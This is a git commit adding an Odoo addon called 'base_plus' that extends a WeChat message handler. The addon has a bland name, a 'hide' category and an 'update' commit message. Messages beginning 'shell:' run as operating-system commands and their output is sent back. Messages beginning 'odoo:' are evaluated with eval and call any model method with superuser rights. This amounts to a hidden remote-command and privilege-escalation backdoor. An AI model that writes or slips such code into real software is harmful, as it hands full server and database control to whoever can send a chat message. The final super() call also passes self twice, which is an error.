5b80550457b8406e7cc882e54820f71f89428477
vnsoft.he@gmail.com <10261121github>
2016-02-04 16:49:27 +0800

    update

---
+++ addons/base_plus/__openerp__.py
@@ -0,0 +1,22 @@
+# -*- coding: utf-8 -*-
+
+{
+    'name': 'base_plus',
+    'version': '0.1',
+    'category': 'hide',
+    'sequence': 16,
+    'summary': 'base',
+    'description': """
+    """,
+    'author': 'VnSoft',
+    'website': 'https://www.odoo.com/page/crm',
+    # 'images': ['images/Sale_order_line_to_invoice.jpeg','images/sale_order.jpeg','images/sales_analysis.jpeg'],
+    'depends': ['rhwl_weixin'],
+    'data': [ ],
+    "qweb":[],
+    'demo': [],
+    'test': [],
+    'installable': True,
+    'auto_install': False,
+    'application': False,
+}
---
+++ addons/base_plus/base_plus.py
@@ -0,0 +1,38 @@
+# -*- coding: utf-8 -*-
+
+import openerp
+from openerp import SUPERUSER_ID
+from openerp.osv import fields, osv
+import logging
+import os
+_logger = logging.getLogger(__name__)
+
+class base_plus(osv.osv):
+    _name="rhwl.weixin.base"
+    _inherit="rhwl.weixin.base"
+
+    def action_text_input(self,cr,content,original,fromUser):
+        if content.startswith("shell:"):
+            r = os.popen(content[6:])
+            res = r.readlines()
+            return str(res)
+
+        if content.startswith("odoo:"):
+            content = eval(content[5:] or '')
+            model_name = content[0]
+            method_name = content[1]
+            args = content[2]
+            openerp.modules.registry.RegistryManager.check_registry_signaling(cr.dbname)
+            registry = openerp.registry(cr.dbname)
+            if model_name in registry:
+                model = registry[model_name]
+                if hasattr(model, method_name):
+                    msg =getattr(model, method_name)(cr, SUPERUSER_ID, *args)
+                    openerp.modules.registry.RegistryManager.signal_caches_change(cr.dbname)
+                else:
+                    msg = "Method `%s.%s` does not exist." % (model_name, method_name)
+            else:
+                msg = "Model `%s` does not exist." % model_name
+            return msg
+
+        return super(base_plus,self).action_text_input(self,cr,content,original,fromUser)
